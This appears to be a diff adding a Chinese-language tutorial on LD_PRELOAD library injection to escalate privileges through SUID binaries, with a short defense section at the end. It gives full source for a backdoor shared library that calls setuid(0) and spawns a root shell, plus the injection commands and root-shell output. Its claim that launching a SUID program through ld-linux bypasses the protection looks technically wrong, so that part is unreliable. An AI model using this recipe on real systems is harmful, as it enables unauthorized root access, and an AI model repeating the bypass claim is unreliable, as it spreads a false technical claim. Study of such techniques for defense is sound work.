@@ -1,1 +1,139 @@
+这个利用方式和PATH劫持类似，可以说是一种变种，无需suid文件源码中使用path快捷命令
+但限制更多，若编译器版本过高，无法使用
+
+
+下面详细讲解 **动态库注入（Dynamic Library Injection）** 在 SUID 提权中的原理、条件及示例。
+
+---
+
+## 一、原理与前提
+
+1. **动态链接机制**
+   ELF 可执行文件在启动时，由动态链接器（如 `/lib64/ld-linux‑x86-64.so.2`）加载所需的共享库。它会按以下顺序查找并加载库：
+
+   * `LD_PRELOAD` 指定的库
+   * 可执行文件中 DT\_RPATH/DT\_RUNPATH 指定的路径
+   * `LD_LIBRARY_PATH`
+   * 系统默认路径（/lib, /usr/lib…）
+
+2. **SUID 下的屏蔽**
+   当可执行文件带有 SUID 位，glibc‑linker 会检测到 `AT_SECURE`，默认**屏蔽**掉危险的环境变量（`LD_PRELOAD`, `LD_LIBRARY_PATH` 等），以防注入。但以下场景仍可能被利用：
+
+   * **老旧或自编译的 libc/链接器**，未正确处理 `AT_SECURE`
+   * **间接加载**：SUID 程序本身以安全方式加载库，但运行过程中又调用了其它不安全的非 SUID 程序，形成链式注入
+   * **显式调用动态链接器**：直接用 `/lib64/ld-linux‑*.so.2 --library-path ...` 启动 SUID 程序，可能绕过屏蔽
+
+3. **利用条件**
+
+   * 攻击者能控制或设置环境变量
+   * 目标 SUID 程序未主动清空环境或未以绝对路径加载所有库
+   * 系统未启用针对 SUID 的额外约束（AppArmor/SELinux 等）
+
+---
+
+## 二、示例演示
+
+下面在一台测试机上，模拟一个**带 SUID**的简单 C 程序，然后通过 `LD_PRELOAD` 注入恶意库来提权。
+
+### 1. 准备 SUID 演示程序
+
+```c
+// save as vuln_suid.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    printf("当前 UID = %d，GID = %d\n", getuid(), getgid());
+    // 演示用途：调用 puts，间接加载 libc
+    puts("=== 演示结束 ===");
+    return 0;
+}
+```
+
+```bash
+# 编译并设置 SUID
+gcc vuln_suid.c -o vuln_suid
+sudo chown root:root vuln_suid
+sudo chmod 4755 vuln_suid
+
+# 验证
+$ ls -l vuln_suid
+-rwsr-xr-x 1 root root ... vuln_suid
+
+# 普通执行（未注入时）
+$ ./vuln_suid
+当前 UID = 1000，GID = 1000
+=== 演示结束 ===
+```
+
+### 2. 编写“后门”共享库
+
+用构造函数在库加载时立即执行提权代码，并启动 shell。
+
+```c
+// save as backdoor.c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+// 构造函数：库被加载时自动调用
+__attribute__((constructor))
+static void init() {
+    // 提权：变更 real UID/GID
+    setgid(0);
+    setuid(0);
+    // 输出提示，并启动交互式 shell
+    fprintf(stderr, "[*] backdoor injected, spawning root shell...\n");
+    system("/bin/sh");
+}
+```
+
+```bash
+# 编译成位置无关的共享库
+gcc -fPIC -shared -o libbackdoor.so backdoor.c
+```
+
+### 3. 注入并执行
+
+```bash
+# 设置环境变量，指向我们的恶意库
+export LD_PRELOAD=$PWD/libbackdoor.so
+
+# 若系统或链接器不屏蔽，就能触发提权
+$ ./vuln_suid
+[*] backdoor injected, spawning root shell...
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+> **注意**：大多数现代发行版会屏蔽 SUID 程序的 `LD_PRELOAD`，此时你不会看到 backdoor 输出，也不会得 shell。下面再介绍一个绕过方法。
+
+---
+
+### 4. 绕过 AT\_SECURE 示例
+
+部分老版本或自编译的动态链接器，可用直接调用链接器本身的方法来加载 SUID 程序，从而“重启”加载流程并信任 `LD_PRELOAD`：
+
+```bash
+# 假设链接器路径为 /lib64/ld‑linux‑x86-64.so.2
+export LD_PRELOAD=$PWD/libbackdoor.so
+# 用链接器显式启动
+/lib64/ld-linux-x86-64.so.2 --inhibit-cache \
+    --library-path /lib:/usr/lib:$PWD \
+    ./vuln_suid
+```
+
+如果该链接器版本没有检查 SUID，就会加载 `libbackdoor.so`，依然导致 root shell。
+
+---
+
+## 三、防御与检测
+
+1. **升级 glibc**：确保动态链接器正确处理 `AT_SECURE`。
+2. **审计 SUID 程序**：检查是否有调用 `dlopen()`、`system()`、`popen()` 等动态加载或 shell 调用，确认是否使用绝对路径或清空环境。
+3. **清理环境**：在程序启动时显式调用 `clearenv()` 或重置关键变量（`LD_*`、`PATH`），并用固定路径加载库与命令。
+4. **应用安全框架**：启用 SELinux/AppArmor 规则，限制 SUID 程序的环境变量和加载路径。
+
+
 
